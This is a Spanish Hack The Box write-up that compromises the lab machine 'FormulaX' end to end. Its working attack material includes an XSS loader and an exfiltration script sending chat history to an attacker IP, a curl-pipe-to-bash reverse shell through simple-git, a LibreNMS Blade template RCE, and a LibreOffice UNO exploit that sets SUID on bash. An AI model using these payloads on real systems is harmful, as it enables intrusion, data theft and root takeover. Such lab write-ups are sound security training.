+++
author = "Andrés Del Cerro"
title = "Hack The Box: FormulaX Writeup | Hard"
date = "2024-07-31"
description = ""
tags = [
    "HackTheBox",
    "FormulaX",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "XSS",
    "Abusing Web Sockets",
    "Abusing LibreOffice Socket",
    "User Pivoting",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Abusing simple-git",
    "Abusing MongoDB",
    "Password Cracking",
    "Port Forwarding",
    "User Pivoting",
    "Creating Admin Account in LibreNMS",
    "Abusing LibreNMS",
    "Credentials Reuse",
    "Linux"
]

+++

# Hack The Box: FormulaX Writeup

# TCP Enumeration
```shell
$ rustscan -a 10.129.230.190 --ulimit 5000 -g
10.129.230.190 -> [22,80]
```

```shell
$ nmap -p22,80 -sCV 10.129.230.190 -Pn -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-31 18:19 CEST
Nmap scan report for 10.129.230.190
Host is up (0.038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
|_  256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /static/index.html
|_http-cors: GET POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.93 seconds
```

# UDP Enumeration
No vemos nada abierto por UDP
```shell
$ sudo nmap --top-ports 1500 10.129.230.190 --min-rate 5000 -n -Pn -sU -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-31 18:20 CEST
Nmap scan report for 10.129.230.190
Host is up (0.037s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
19998/udp closed unknown
30465/udp closed unknown
34861/udp closed unknown
42508/udp closed candp
49163/udp closed unknown
49207/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds
```

# Web Enumeration
```shell
$ whatweb http://10.129.230.190
http://10.129.230.190 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.230.190], RedirectLocation[/static/index.html], UncommonHeaders[access-control-allow-origin,access-control-allow-credentials], X-Powered-By[Express], nginx[1.18.0]
http://10.129.230.190/static/index.html [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.230.190], PasswordField[psw], Script, UncommonHeaders[access-control-allow-origin,access-control-allow-credentials], X-Powered-By[Express], nginx[1.18.0]
```

Vemos un panel de inicio de sesión.
![Write-up Image](images/Screenshot_1.png)

Después de hacernos una cuenta de usuario, podemos ver que este servicio web ofrece una especie de chatbot.
![Write-up Image](images/Screenshot_2.png)

Si nos damos cuenta, esta es una página estática en `html` por lo cual por detrás se debe de estar empleando javascript para la comunicación con algún servidor.
![Write-up Image](images/Screenshot_3.png)
Y podemos comprobar el uso de websockets.

En el apartado de `Contact Us` , haciendo unas pruebas podemos ver que se acontece un XSS.
![Write-up Image](images/Screenshot_4.png)

```shell
 python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.230.190 - - [31/Jul/2024 18:24:55] code 404, message File not found
10.129.230.190 - - [31/Jul/2024 18:24:55] "GET /img.png HTTP/1.1" 404 -
10.129.230.190 - - [31/Jul/2024 18:24:59] code 404, message File not found
10.129.230.190 - - [31/Jul/2024 18:24:59] "GET /img.png HTTP/1.1" 404 -
10.129.230.190 - - [31/Jul/2024 18:25:01] code 404, message File not found
10.129.230.190 - - [31/Jul/2024 18:25:01] "GET /img.png HTTP/1.1" 404 -
10.129.230.190 - - [31/Jul/2024 18:25:06] code 404, message File not found
10.129.230.190 - - [31/Jul/2024 18:25:06] "GET /img.png HTTP/1.1" 404 -
10.129.230.190 - - [31/Jul/2024 18:25:08] code 404, message File not found
10.129.230.190 - - [31/Jul/2024 18:25:08] "GET /img.png HTTP/1.1" 404 -
```

No podemos hacer un Cookie hijacking ya que está activado el `HttpOnly`
![Write-up Image](images/Screenshot_5.png)

Después de investigar un rato, me dió por fuzzear el sitio web ya que todavía no lo había hecho.
```shell
$ feroxbuster -u http://10.129.230.190 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
                                                                                          
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.4
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.230.190
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.4
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        1l        4w       40c http://10.129.230.190/ => http://10.129.230.190/static/index.html
301      GET       10l       16w      173c http://10.129.230.190/img => http://10.129.230.190/img/
200      GET        1l        3w       46c http://10.129.230.190/contact_us
200      GET        1l        3w       46c http://10.129.230.190/admin
301      GET       10l       16w      179c http://10.129.230.190/static => http://10.129.230.190/static/
301      GET       10l       16w      181c http://10.129.230.190/scripts => http://10.129.230.190/scripts/
200      GET        1l        3w       46c http://10.129.230.190/chat
200      GET        1l        3w       46c http://10.129.230.190/logout
200      GET        1l        3w       46c http://10.129.230.190/Contact_Us
301      GET       10l       16w      181c http://10.129.230.190/Scripts => http://10.129.230.190/Scripts/
200      GET        1l        3w       46c http://10.129.230.190/Chat
301      GET       10l       16w      187c http://10.129.230.190/restricted => http://10.129.230.190/restricted/
200      GET        1l        3w       46c http://10.129.230.190/Admin
[>-------------------] - 49s    35083/1323280 35m     found:13      errors:0
```

# Information Leakage via XSS
Y al ver el directorio `Scripts` recordé el chatbot que existía y el comando `help` que este tiene para recuperar el historial de comandos. Quizá puedo aprovecharme del XSS para inyectar una comunicación entre el chatbot y el usuario víctima para recuperar su historial y obtener información privilegiada.

Localicé que el script `socket.io.js` en `http://10.129.230.190/socket.io/socket.io.js`

Por lo cual podría simplemente inyectar este script y realizar la comunicación. Pero antes, tengo que ver como se realiza la comunicación desde el cliente.

Encontramos el script `chat.js`
`http://10.129.230.190/restricted/chat.js`

Y vemos este apartado
```javascript
let value;
const res = axios.get(`/user/api/chat`);
const socket = io('/',{withCredentials: true});


//listening for the messages
socket.on('message', (my_message) => {

  //console.log("Received From Server: " + my_message)
  Show_messages_on_screen_of_Server(my_message)

})
```

Esto lo hago para hacerme una idea ya que no había trabajado con websockets antes.

Ahora, tengo que refinar el XSS para poder cargar un archivo javascript malicioso, por ahora este va a ser el archivo.
```shell
$ cat evil.js 
fetch("http://10.10.14.71:8081/injected")
```

Después de hacer unas pruebas en local..
```shell
$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
127.0.0.1 - - [31/Jul/2024 18:46:37] "GET /test.html HTTP/1.1" 200 -
127.0.0.1 - - [31/Jul/2024 18:46:37] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [31/Jul/2024 18:46:37] code 404, message File not found
127.0.0.1 - - [31/Jul/2024 18:46:37] "GET /favicon.ico HTTP/1.1" 404 -
10.10.14.71 - - [31/Jul/2024 18:46:37] "GET /evil.js HTTP/1.1" 200 -
```

Este es mi payload final
```html
└──╼ [★]$ cat test.html 
<IMG SRC="/" onerror="
  var script = document.createElement('script');
  script.src = 'http://10.10.14.71:8081/evil.js';
  document.head.appendChild(script);
">
```

Y perfecto, ahora solo falta hacer el código javascript malicioso.
![Write-up Image](images/Screenshot_6.png)

Podemos interceptar una petición de mensaje con `burpsuite` para hacernos una mejor idea de como se tramita el mensaje por detrás.
![Write-up Image](images/Screenshot_7.png)

Después de probar un rato...
```shell
$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.230.190 - - [31/Jul/2024 19:18:34] "GET /evil.js HTTP/1.1" 200 -
10.129.230.190 - - [31/Jul/2024 19:18:34] code 501, message Unsupported method ('OPTIONS')
10.129.230.190 - - [31/Jul/2024 19:18:34] "OPTIONS /injected HTTP/1.1" 501 -
10.129.230.190 - - [31/Jul/2024 19:18:34] code 501, message Unsupported method ('OPTIONS')
10.129.230.190 - - [31/Jul/2024 19:18:34] "OPTIONS /loadedd HTTP/1.1" 501 -
10.129.230.190 - - [31/Jul/2024 19:18:34] code 501, message Unsupported method ('OPTIONS')
10.129.230.190 - - [31/Jul/2024 19:18:34] "OPTIONS /?q=Greetings!.%20How%20can%20i%20help%20you%20today%20?.%20You%20can%20type%20help%20to%20see%20some%20buildin%20commands HTTP/1.1" 501 -
```

Este es el archivo `evil.js`
```javascript
$ cat evil.js 
fetch("http://10.10.14.71:8081/injected")

// Incluimos el socket.io.js ya que en principio no está incluido.
const script = document.createElement("script")
script.src = "http://10.129.230.190/socket.io/socket.io.js"
document.head.appendChild(script)

// Esperamos a que carge el script......
script.addEventListener('load', function() {
	fetch("http://10.10.14.71:8081/loadedd")
	const res = fetch('/user/api/chat'); // No se si está la libreria de axios inyectada ya
	const socket = io('/',{withCredentials: true});
	socket.on('message', (msg) => {
		fetch("http://10.10.14.71:8081/?q=" + msg)
	});
	socket.emit('client_message', 'help');
});
```

Vamos a hacer un par de retoques finales, primero vamos a codificar en base64 la respuesta para poder verla mas cómoda.

Modificamos la linea `fetch("http://10.10.14.71:8081/?q=" + msg)` por `fetch("http://10.10.14.71:8081/?q=" + btoa(msg))`

Y la linea `socket.emit('client_message', 'help')` por `socket.emit('client_message', 'history')` ya que lo que queremos es ver el historial del usuario.

Y recibimos la siguiente data
```shell
$ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
10.129.230.190 - - [31/Jul/2024 19:22:40] "GET /evil.js HTTP/1.1" 200 -
10.129.230.190 - - [31/Jul/2024 19:22:40] code 501, message Unsupported method ('OPTIONS')
10.129.230.190 - - [31/Jul/2024 19:22:40] "OPTIONS /injected HTTP/1.1" 501 -
10.129.230.190 - - [31/Jul/2024 19:22:40] code 501, message Unsupported method ('OPTIONS')
10.129.230.190 - - [31/Jul/2024 19:22:40] "OPTIONS /loadedd HTTP/1.1" 501 -
10.129.230.190 - - [31/Jul/2024 19:22:40] code 501, message Unsupported method ('OPTIONS')
10.129.230.190 - - [31/Jul/2024 19:22:40] "OPTIONS /?d=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== HTTP/1.1" 501 -
10.129.230.190 - - [31/Jul/2024 19:22:40] code 501, message Unsupported method ('OPTIONS')
10.129.230.190 - - [31/Jul/2024 19:22:40] "OPTIONS /?d=R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM= HTTP/1.1" 501 -
10.129.230.190 - - [31/Jul/2024 19:22:40] code 501, message Unsupported method ('OPTIONS')
10.129.230.190 - - [31/Jul/2024 19:22:40] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk= HTTP/1.1" 501 -
10.129.230.190 - - [31/Jul/2024 19:22:40] code 501, message Unsupported method ('OPTIONS')
10.129.230.190 - - [31/Jul/2024 19:22:40] "OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgdG8gYXV0b21hdGUgdGhlIGF1dG8tdXBkYXRl HTTP/1.1" 501 -
10.129.230.190 - - [31/Jul/2024 19:22:40] code 501, message Unsupported method ('OPTIONS')
10.129.230.190 - - [31/Jul/2024 19:22:40] "OPTIONS /?d=TWVzc2FnZSBTZW50Ojxicj5oaXN0b3J5 HTTP/1.1" 501 -
```

Decodificando las cadenas podemos ver que hemos descubierto un subdominio.
`dev-git-auto-update.chatbot.htb`
![Write-up Image](images/Screenshot_8.png)

# Foothold
Descubrimos otro servicio extra.
![Write-up Image](images/Screenshot_9.png)

Con un vistazo rápido a la página detectamos que se está usando `simple-git v3.14`
![Write-up Image](images/Screenshot_10.png)

Y una simple búsqueda en Google nos reporta que tiene una vulnerabilidad de tipo RCE. Lo podemos leer [aquí](https://github.com/gitpython-developers/GitPython/issues/1515)

![Write-up Image](images/Screenshot_11.png)

¡Y tenemos RCE!
```shell
$ sudo tcpdump icmp -i tun0
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
19:30:29.164331 IP dev-git-auto-update.chatbot.htb > 10.10.14.71: ICMP echo request, id 1, seq 1, length 64
19:30:29.164390 IP 10.10.14.71 > dev-git-auto-update.chatbot.htb: ICMP echo reply, id 1, seq 1, length 64
19:30:30.165628 IP dev-git-auto-update.chatbot.htb > 10.10.14.71: ICMP echo request, id 1, seq 2, length 64
19:30:30.165657 IP 10.10.14.71 > dev-git-auto-update.chatbot.htb: ICMP echo reply, id 1, seq 2, length 64
19:30:31.167686 IP dev-git-auto-update.chatbot.htb > 10.10.14.71: ICMP echo request, id 1, seq 3, length 64
19:30:31.167716 IP 10.10.14.71 > dev-git-auto-update.chatbot.htb: ICMP echo reply, id 1, seq 3, length 64
```

Nos creamos un `rev.sh`
```shell
#!/bin/bash

bash -c "bash -i >& /dev/tcp/10.10.14.71/443 0>&1"
```

Nos ponemos en escucha con `netcat` y usamos este payload `ext::sh -c curl% http://10.10.14.71:8081/rev.sh|bash`


# User Pivoting 1
Enumerando la máquina víctima nos encontramos que hay una instancia de mongodb.
`tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -`

Lo podemos ver mediante el comando `netstat -tulnp` o revisando el archivo `.env` de la aplicación.
```venv
www-data@formulax:~/app$ cat .env
cat .env
PORT = 8082
URL_DATABASE="mongodb://localhost:27017"
SECRET=ThisIsTheN0deSecret
ADMIN_EMAIL="admin@chatbot.htb"
```

con `mongo --shell` podemos hacer peticiones mediante el CLI.

Enumerando las Bases de Datos vemos las siguientes
```mongo
show dbs
admin    0.000GB
config   0.000GB
local    0.000GB
testing  0.000GB
```

Enumerando las "tablas" (colecciones en mongo), la única que me llaman la atención es `messages` y `users`

```mongo
use admin
switched to db admin
show collections
system.version
use config
switched to db config
show collections
system.sessions
use local
switched to db local
show collections
startup_log
use testing
switched to db testing
show collections
messages
users
```

La colección de mensajes está vacía pero la de usuarios no.
```mongo
db.messages.find()

db.users.find()
{ "_id" : ObjectId("648874de313b8717284f457c"), "name" : "admin", "email" : "admin@chatbot.htb", "password" : "$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.", "terms" : true, "value" : true, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MjI0NDA0MDh9.q_R-YzbX7fuJigMJuVCeuIIlr3WhWPQSwHd5HkU9BYs", "__v" : 0 }
{ "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }
{ "_id" : ObjectId("66aa51b7af10999e6470d490"), "name" : "pointed", "email" : "pointed@pointed.com", "password" : "$2b$10$zhNJTJtpGe3/6QILJisd6uednRpMdaTopmes6TCgFL1KFkGQdjdpq", "terms" : true, "value" : false, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NmFhNTFiN2FmMTA5OTllNjQ3MGQ0OTAiLCJpYXQiOjE3MjI0Mzg1NzZ9.EpNX-g0c9erS1XM7BDde8nLVhkDkzhpkoeTBV8fRKug", "__v" : 0 }
```

Y tenemos hashes que podemos intentar crackear.

Revisando el example-hashes de hashcat. Puede ser un hash `bcrypt(sha256($pass)) / bcryptsha256 *`
![Write-up Image](images/Screenshot_12.png)

Pero no se encuentra el módulo en hashcat.
![Write-up Image](images/Screenshot_14.png)

Por lo cual antes de descargar nada, probé el otro módulo que podía ser..
`bcrypt $2*$, Blowfish (Unix)`
![Write-up Image](images/Screenshot_13.png)
Consigo crackear el hash correspondiente al usuario `frank_dorky` , el del usuario administrador no.
![Write-up Image](images/Screenshot_15.png)

Y esta es la password de `frank_dorky` para acceder por SSH
```shell
$ ssh frank_dorky@10.129.230.190
The authenticity of host '10.129.230.190 (10.129.230.190)' can't be established.
ED25519 key fingerprint is SHA256:e0esz1Aos6gxct2ci4LGbCAR6i31EoktxFIvCFF+rcM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.230.190' (ED25519) to the list of known hosts.
frank_dorky@10.129.230.190's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Jul 15 13:46:54 2024 from 10.10.14.41
frank_dorky@formulax:~$
```

Con este usuario podemos leer la flag `user.txt`

# User Pivoting 2
Pasando el `linpeas.sh` me he dado cuenta de otro puerto interesante que se me había pasado.
```shell
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8082          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8081          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:42931         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      - 
```

En la máquina están abiertos varios puertos que no he revisado.
Sabemos que el puerto `8082` corresponde a la aplicación principal, pero no se nada sobre los puertos `8081`, `8000` y `3000`

En el puerto `8000` vemos lo siguiente y después de enumerar un rato no encuentro nada interesante así que supuse que era un rabbit hole.
![Write-up Image](images/Screenshot_16.png)

Y en el puerto `8081` nos damos cuenta de que es el servicio que hemos explotado anteriormente.
![Write-up Image](images/Screenshot_17.png)

Así que ahora hacemos el port forwarding al puerto `3000`
`$ sshpass -p 'manchesterunited' ssh -L 3000:127.0.0.1:3000 frank_dorky@10.129.230.190`

Y vemos un CMS llamado `LibreNMS` y las credenciales encontradas para el usuario `frank_dorky` son válidas.
![Write-up Image](images/Screenshot_18.png)

Encontramos varias vulnerabilidades para LibreNMS.
La que mas me llamó la atención fue [esta](https://www.shielder.com/advisories/librenms-about-authenticated-command-injection/) pero es para una versión mas antigua.

Inspeccionando otros exploits me di cuenta de una ruta en especifico.
![Write-up Image](images/Screenshot_19.png)

A la cual no tenía permisos para acceder, así que supuse que `frank_dorky` es un usuario de bajos privilegios en este panel.
![Write-up Image](images/Screenshot_20.png)

Investigando un poco sobre como podría añadir un usuario administrador, me encontré con este [post](https://community.librenms.org/t/adding-admin-users-on-librenms/20782)

Ahora solo necesito saber donde está el archivo `adduser.php`

Un poco oculto pero encontré el archivo..
```shell
rank_dorky@formulax:/opt/librenms$ ls
ls: cannot open directory '.': Permission denied
frank_dorky@formulax:/opt/librenms$ ls -l adduser.php
-rwxr-xr-x 1 librenms librenms 956 Oct 18  2022 adduser.php
```

Por lo cual añadí al usuario
```shell
ky@formulax:/opt/librenms$ ./adduser.php pointed pointed 10
User pointed added successfully
```

Y ahora sí que pude acceder a las funciones restringidas para administradores del CMS.
![Write-up Image](images/Screenshot_21.png)

Tras buscar mas y mas, encontré este otro [post](https://www.sonarsource.com/blog/it-s-a-snmp-trap-gaining-code-execution-on-librenms/)

Donde se habla de un XSS que podría elevarse a un RCE, a mí solo me importa la parte del RCE.

```
The impact of this vulnerability is greatly increased due to a feature called Alert Templates. This feature allows administrators to create custom templates that will be populated with specific values when an alert occurs.


The template engine used for this feature is Blade. The user-provided custom templates are rendered inline by using the Blade::render method:


librenms/includes/html/forms/alert-templates.inc.php

<?php
Blade::render($vars['template']);

Attackers with the ability to control the value passed to this method can directly gain code execution. This is due to the fact that Blade templates allow executing arbitrary PHP code via the @php directive:


@php
  system("id>/tmp/pwned");
@endphp
```

Por lo cual nos dirigimos a `Alert Templates`
![Write-up Image](images/Screenshot_22.png)

Creamos una plantilla maliciosa..
![Write-up Image](images/Screenshot_23.png)

Al intentar agregar la plantilla se quedaba colgado, así que revisando la consola del navegador, descubro un subdominio que debo de agregar al `/etc/hosts`
![Write-up Image](images/Screenshot_24.png)
```shell
$ cat /etc/hosts
# Host addresses
127.0.0.1  localhost librenms.com
```

Ahora, accediendo con el dominio correcto, sí me deja crear la plantilla maliciosa.
![Write-up Image](images/Screenshot_25.png)

Y ganamos acceso como `librenms`
```shell
$ sudo rlwrap -cEr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.71] from (UNKNOWN) [10.129.230.190] 57972
bash: cannot set terminal process group (970): Inappropriate ioctl for device
bash: no job control in this shell
librenms@formulax:~$ 
```

Revisando las variables de entorno de la aplicación vemos lo siguiente
```shell
DB_USERNAME=kai_relay
DB_PASSWORD=mychemic...
```

Esta credencial es la del usuario `kai_relay`

# Privilege Escalation
```shell
kai_relay@formulax:~$ sudo -l
Matching Defaults entries for kai_relay on forumlax:
    env_reset, timestamp_timeout=0, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_reset, timestamp_timeout=0

User kai_relay may run the following commands on forumlax:
    (ALL) NOPASSWD: /usr/bin/office.sh
```

Podemos ejecutar como cualquier usuario, root incluido, el script `/usr/bin/office.sh`

Analizando este script
```shell
kai_relay@formulax:~$ cat /usr/bin/office.sh
#!/bin/bash
/usr/bin/soffice --calc --accept="socket,host=localhost,port=2002;urp;" --norestore --nologo --nodefault --headless
```

- `--calc`: Esta opción abre la aplicación de hojas de cálculo (Calc) de LibreOffice o OpenOffice.
    
- `--accept="socket,host=localhost,port=2002;urp;"`: Esta opción permite que LibreOffice acepte conexiones desde un cliente a través de un socket. En este caso, el socket está configurado para escuchar en el host `localhost` y el puerto `2002`. `urp` se refiere al protocolo Universal Remote Protocol de LibreOffice, que permite la comunicación entre clientes y la instancia de LibreOffice.
    
- `--norestore`: Deshabilita la restauración de documentos que estaban abiertos antes de un cierre inesperado o un fallo.
    
- `--nologo`: Desactiva la pantalla de inicio (logo) de LibreOffice.
    
- `--nodefault`: Evita que se abra cualquier documento predeterminado.
    
- `--headless`: Ejecuta LibreOffice en modo sin cabeza, es decir, sin interfaz gráfica de usuario. Esto es útil para operaciones automáticas o en servidores donde no hay un entorno gráfico disponible.

Este script inicia LibreOffice Calc en modo sin cabeza, aceptando conexiones de clientes a través de un socket en `localhost` en el puerto `2002`, y desactiva diversas funcionalidades como la restauración de documentos, la pantalla de inicio y la apertura de documentos por defecto.

Este script tampoco nos sirve de mucho pero si hacemos una búsqueda en Google... ![Write-up Image](images/Screenshot_26.png)

Nos descargamos el exploit.
```shell
 searchsploit -m multiple/remote/46544.py
  Exploit: Apache UNO / LibreOffice Version: 6.1.2 / OpenOffice 4.1.6 API - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46544
     Path: /opt/exploitdb/exploits/multiple/remote/46544.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/pointedsec/Desktop/formulax/exploits/46544.py


┌─[192.168.1.52]─[pointedsec@parrot]─[~/Desktop/formulax/exploits]
└──╼ [★]$ mv 46544.py rce.py
```

Modificamos el exploit para asignar el permiso de SUID al binario`/bin/bash`.
![Write-up Image](images/Screenshot_27.png)

Ahora nos pasamos el exploit a la máquina víctima.

Ejecutamos el script como sudo para establecer la conexión y poder conectarnos al socket para realizar la explotación.
```shell
kai_relay@formulax:/tmp$ sudo /usr/bin/office.sh
```

Y ahora como cualquier usuario (ya tenía abierta una terminal como `frank_dorky`, no hace falta ejecutar el exploit como `kai_relay`)

```shell
rank_dorky@formulax:/tmp$ python3 rce.py --host 127.0.0.1 --port 2002
[+] Connecting to target...
[+] Connected to 127.0.0.1
```

Y vemos lo siguiente en la otra terminal donde estamos ejecutando el script. 
![Write-up Image](images/Screenshot_28.png)

Vamos a cambiar el exploit de nuevo y vamos a especificar que queremos que ejecute un archivo en bash que vamos a crear ahora mismo.

![Write-up Image](images/Screenshot_29.png)

Le asignamos permisos de ejecución `kai_relay@formulax:/tmp$ chmod +x pwn.sh`

Modificamos el exploit de nuevo..
```python
shell_execute.execute("/tmp/pwn.sh", '',1)
```

Ahora al lanzar el exploit...
```shell
frank_dorky@formulax:/tmp$ python3 rce.py --host 127.0.0.1 --port 2002
[+] Connecting to target...
[+] Connected to 127.0.0.1
```

No nos muestra nada por la otra terminal...
![Write-up Image](images/Screenshot_30.png)

Y ya vemos que se ha asignado el permiso SUID a la bash.
![Write-up Image](images/Screenshot_31.png)

```shell
frank_dorky@formulax:/tmp$ bash -p
bash-5.1# id
uid=1002(frank_dorky) gid=1002(frank_dorky) euid=0(root) groups=1002(frank_dorky)
```

¡Y ya hemos escalado privilegios!

```shell
bash-5.1# cat /root/root.txt
04da1f3886a9...
```

Happy Hacking! 🚀